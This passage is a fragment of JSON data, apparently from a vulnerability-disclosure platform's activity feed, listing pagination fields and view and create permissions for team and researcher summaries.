rue,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}